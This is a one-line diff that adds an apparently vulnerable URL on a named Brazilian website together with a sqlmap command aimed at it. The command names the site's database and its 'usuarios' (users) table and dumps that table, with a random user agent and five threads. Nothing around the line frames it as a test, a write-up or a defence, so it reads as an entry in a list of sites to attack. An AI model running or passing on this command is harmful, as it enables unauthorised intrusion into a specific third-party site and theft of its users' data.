@@ -1,0 +1,1 @@
+https://www.f2conteudo.com.br/servicos.php?servico=2 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.f2conteudo.com.br/servicos.php?servico=2 -D f2conteu_db -T usuarios --dump
